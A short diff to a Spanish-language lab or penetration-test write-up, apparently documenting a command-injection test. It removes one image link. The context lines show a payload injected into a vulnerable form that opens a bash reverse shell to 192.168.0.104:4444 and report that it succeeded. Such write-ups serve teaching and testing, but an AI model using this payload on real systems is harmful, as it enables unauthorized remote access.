@@ -310,8 +310,6 @@ Posteriormente se introdujo el siguiente payload en el formulario vulnerable:
 127.0.0.1 ; bash -c "bash -i >& /dev/tcp/192.168.0.104/4444 0>&1"
 ```
 
-![Despliegue](Imagenes/pruebauno.png)
-
 ![Despliegue](Imagenes/payload.png)
 
 La ejecución fue exitosa y se obtuvo una reverse shell sobre el sistema objetivo.
